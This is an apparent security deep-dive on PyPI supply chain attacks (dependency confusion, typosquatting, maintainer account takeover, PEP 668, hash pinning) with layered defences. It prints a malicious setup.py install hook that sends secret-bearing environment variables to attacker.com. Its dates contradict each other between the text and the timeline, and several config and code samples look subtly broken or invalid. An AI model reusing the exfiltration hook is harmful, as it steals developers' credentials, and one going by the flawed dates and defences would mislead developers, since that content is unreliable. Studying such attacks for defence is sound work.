# PyPI Supply Chain Security: Deep Dive

> **Category:** Supply Chain  
> **Language:** Python  
> **Severity:** High to Critical  
> **Topics:** Dependency Confusion, Typosquatting, PEP 668, Hash Pinning, Package Hijacking

## Overview

The Python Package Index (PyPI) is the largest Python package repository, hosting over 500,000 packages with billions of monthly downloads. Its open nature makes it a prime target for supply chain attacks. Unlike traditional vulnerabilities that exploit code flaws, supply chain attacks exploit **trust** — tricking developers into installing malicious packages.

---

## Attack Vector 1: Dependency Confusion

### The Original Attack (2021)

**Source:** https://medium.com/@alex.birsan/dependency-confusion-how-i-hacked-into-apple-microsoft-and-dozens-of-other-companies-4a5d60fec610

In 2021, security researcher Alex Birsan demonstrated a large-scale dependency confusion attack. The core idea: if a company uses a private package name on PyPI (e.g., `internal-auth-lib`), an attacker can upload a public package with the **same name** to PyPI. Since pip prioritizes the highest version number, the attacker's malicious package gets installed.

### How It Works

```bash
# Company uses a private package hosted on their own PyPI server
# Requirements file:
--extra-index-url https://private-pypi.company.com/simple
internal-auth-lib>=1.0.0
common-package==2.3.0

# Attacker uploads "internal-auth-lib" to PUBLIC PyPI with version 9.9.9
# pip downloads the public package because version 9.9.9 > company's 1.0.0
# RCE achieved!
```

### Modern Variant: Conditional Package Names

In 2024-2025, attackers evolved the technique. Instead of guessing internal package names, they:

1. Scrape leaked `requirements.txt` files from GitHub
2. Scan error messages in public bug trackers for unique module names
3. Monitor PyPI uploads to find packages that don't exist yet and squat them

### Detection and Prevention

```bash
# 1. Use pip's --no-deps and explicit dependency pinning
pip install --no-deps -r requirements.txt

# 2. Pin to exact versions with hashes (PEP 665)
# requirements.txt:
internal-auth-lib==1.0.0 --hash=sha256:abc123...

# 3. Use .pypirc to configure index priority
# ~/.pypirc:
[distutils]
index-servers =
    pypi
    private

[private]
repository: https://private-pypi.company.com/simple
username: __token__
password: pypi-xxxx...
priority: always  # pip 23.1+ : always check private first
```

**References:**
- https://medium.com/@alex.birsan/dependency-confusion-how-i-hacked-into-apple-microsoft-and-dozens-of-other-companies-4a5d60fec610

---

## Attack Vector 2: Typosquatting Campaigns

### Colorama vs. Colourama (2025)

**Source:** https://checkmarx.com/zero-post/python-pypi-supply-chain-attack-colorama/

In May 2025, Checkmarx researchers uncovered a typosquatting campaign targeting `colorama` — one of the most downloaded Python packages (~100M+/week). Attackers named their packages with slight variations:

```python
# Legitimate: colorama
# Typosquatted:
# - colourama   (extra 'u')
# - coloram     (missing 'a')
# - coloramaa   (double 'a')
# - colourma    (British spelling confusion)
```

### How the Attack Worked

```python
# The malicious package had identical API to colorama
# BUT also included a post-install script:

# setup.py (malicious)
from setuptools import setup
from setuptools.command.install import install

class PostInstallCommand(install):
    def run(self):
        # Exfiltrate environment variables
        import os, requests
        env_data = {k: v for k, v in os.environ.items() 
                    if 'SECRET' in k or 'TOKEN' in k or 'KEY' in k}
        requests.post("https://attacker.com/exfil", json=env_data)
        install.run(self)

setup(
    name="colourama",
    version="0.4.6",
    cmdclass={"install": PostInstallCommand},
    # ... legitimate-looking metadata
)
```

### The AI/ML Supply Chain Campaign (2025)

**Source:** https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-pypi-supply-chain-campaign-20260329-csa/

In early 2025, the "TeamPCP" campaign targeted AI/ML developers. Attackers uploaded packages impersonating Alibaba Cloud AI Labs SDKs. The packages:

1. Had legitimate-sounding names like `alibaba-ai-sdk`
2. Included working ML functionality (to avoid suspicion)
3. Contained hidden telemetry that exfiltrated training data and API keys

### Detection

```bash
# Check for typosquatting with pip-audit or guarddog
pip install guarddog
guarddog scan requirements.txt
```

```python
# Programmatic detection
difflib.SequenceMatcher(None, "colorama", "colourama").ratio()
# 0.875 — suspiciously close
```

**References:**
- https://checkmarx.com/zero-post/python-pypi-supply-chain-attack-colorama/
- https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-pypi-supply-chain-campaign-20260329-csa/

---

## Attack Vector 3: Package Hijacking (Account Takeover)

### LiteLLM Compromise (2025)

**Source:** https://www.facebook.com/CQURE/posts/litellm-has-confirmed-a-supply-chain-compromise-involving-malicious-pypi-package/1371313088364143/

In 2025, LiteLLM (a popular AI proxy) confirmed a supply chain compromise. A maintainer's PyPI account credentials were stolen (likely via phishing or session hijacking), allowing attackers to upload malicious versions (v1.82.7 and v1.82.8).

### The Attack Chain

```
1. Maintainer's PyPI account compromised
2. Attacker uploads v1.82.7 with backdoor
3. pip install liteLLM downloads compromised version
4. Backdoor activates, exfiltrates API keys and model configuration
```

### Prevention: 2FA and API Tokens

```bash
# PyPI now requires 2FA for all maintainers (as of 2024)

# Use limited-scope API tokens, not passwords
# PyPI tokens can be scoped to:
# - A specific project
# - Upload only (no delete)
# - Expire after a set time
```

---

## Attack Vector 4: PEP 668 and Environment Isolation

**Source:** https://peps.python.org/pep-0668/

PEP 668 (adopted in Python 3.11+) introduces externally-managed environment markers to prevent pip from conflicting with system package managers.

### Security Implication

While PEP 668 is designed to prevent accidental breakage, it also makes it harder to detect supply chain attacks because:

- `pip install` on system Python now fails with an error
- Developers use `--break-system-packages` to bypass (which also bypasses safety checks)
- Virtual environments become mandatory — but not everyone uses them

```bash
# PEP 668 error on Debian/Ubuntu with Python 3.11+
$ pip install requests
error: externally-managed-environment
× This environment is externally managed
╰─> To install Python packages system-wide, try apt install python3-requests

# Dangerous bypass:
pip install malicious-package --break-system-packages  # Skips all safety checks
```

### Best Practice

```bash
# Always use virtual environments — don't bypass PEP 668
python -m venv .venv
source .venv/bin/activate
pip install malicious-package  # This would still install it, but at least
# not system-wide. Validate packages before installing.
```

---

## Attack Vector 5: Hash Pinning Failures

### The Problem

Many Python projects pin dependency versions but **not hashes**. An attacker who compromises a package at a pinned version (e.g., by hijacking the PyPI account) can replace the package content while keeping the same version number.

### PEP 458 / PEP 480: Secure Wheel Distribution

```bash
# PEP 458 proposes signed package metadata
# PEP 480 proposes repository-level signing

# In the meantime, use hash pinning (PEP 665 style):
# requirements.txt with hashes:
requests==2.32.0 --hash=sha256:fc821e024c1ebc23f4d6e1d2f3c1a5e4f1a6b5e4f1a6b5e4f1a6b5e4f1a6b5e4
numpy==2.0.0 --hash=sha256:abc123...
```

### Using pip hash checking

```bash
# Generate hashes for all dependencies
pip install pip-tools
pip-compile --generate-hashes requirements.in > requirements.txt

# Install with hash verification
pip install --require-hashes -r requirements.txt
# Fails if ANY package hash doesn't match
```

---

## Real Attack Timeline (2024-2025)

| Date | Attack | Impact | Discovery |
|------|--------|--------|-----------|
| Jan 2024 | Typosquatting campaign mimicking 20+ ML packages | API key theft | Checkmarx |
| Mar 2024 | `colorama` typosquatting (17 packages) | Developer credential theft | Checkmarx |
| Jul 2024 | Dependency confusion on `aws-cdk` variants | CI/CD token theft | AWS Security |
| Sep 2024 | PyPI account takeover via session hijacking | 3 packages backdoored | PyPI Security |
| Nov 2024 | AI/ML SDK impersonation (TeamPCP) | Training data exfiltration | Cloud Security Alliance |
| Mar 2025 | LiteLLM maintainer account compromise | AI API key theft | CQURE |
| Jun 2025 | `alibaba-ai-sdk` typosquatting | Credential exfiltration | Cloud Security Alliance |

---

## Defense-in-Depth Strategy

### Layer 1: Pipeline Controls

```yaml
# .github/workflows/dependency-check.yml
steps:
  - uses: actions/checkout@v4
  - name: Scan dependencies
    run: |
      pip install pip-audit guarddog
      # Scan for known vulnerabilities
      pip-audit -r requirements.txt
      # Scan for typosquatting
      guarddog scan requirements.txt
      # Check metadata
      guarddog check -o json -t typo-squatting,colusion
```

### Layer 2: Package Source Validation

```python
# Always pin to specific sources
PREFERRED_SOURCES = {"https://pypi.org/simple/", "https://private-pypi.company.com/"}

def validate_package_source(package_name: str) -> bool:
    """Ensure package comes from an authorized source."""
    import json, urllib.request
    
    for source in PREFERRED_SOURCES:
        url = f"{source}{package_name}/json"
        try:
            # Check if package exists on our preferred sources
            response = urllib.request.urlopen(url)
            data = json.loads(response.read())
            # Verify maintainer is authorized
            author = data["info"]["author_email"]
            return author in ALLOWED_MAINTAINERS
        except urllib.error.HTTPError:
            continue
    return False
```

### Layer 3: Runtime Detection

```python
# Monitor for unexpected package loads at runtime
import sys
from collections import defaultdict

_loaded_modules = defaultdict(list)

original_import = __builtins__.__import__
def monitored_import(name, *args, **kwargs):
    module = original_import(name, *args, **kwargs)
    _loaded_modules[name].append({
        "file": getattr(module, "__file__", None),
        "time": __import__("time").time()
    })
    return module

__builtins__.__import__ = monitored_import
```

### Layer 4: Policy Enforcement

```bash
# Use pip's new dependency groups (PEP 735)
# pyproject.toml:
[dependency-groups]
prod = ["django>=5.0", "requests>=2.32"]
dev = ["pytest>=8.0", "black>=24.0"]
audit = {include-group="prod", include-group="dev", extend=["pip-audit>=2.0"]}

# Run separately:
pip install --group prod --require-hashes
```

---

## References

1. https://medium.com/@alex.birsan/dependency-confusion-how-i-hacked-into-apple-microsoft-and-dozens-of-other-companies-4a5d60fec610 — Original dependency confusion paper
2. https://checkmarx.com/zero-post/python-pypi-supply-chain-attack-colorama/ — Colorama typosquatting
3. https://labs.cloudsecurityalliance.org/research/csa-research-note-ai-pypi-supply-chain-campaign-20260329-csa/ — AI/ML supply chain campaign
4. https://peps.python.org/pep-0668/ — PEP 668 externally managed environments
5. https://peps.python.org/pep-0458/ — PEP 458 secure PyPI distribution
6. https://discuss.python.org/t/typosquatting-dependency-confusion-supply-chain-attack-call-it-as-you-wish/52615 — Python discourse on typosquatting
7. https://sixhackacademy.com/en/blog/dependency-confusion-malicious-packages/ — Dependency confusion overview
8. https://blog.gitguardian.com/protecting-your-software-supply-chain-understanding-typosquatting-and-dependency-confusion-attacks/ — GitGuardian supply chain guide
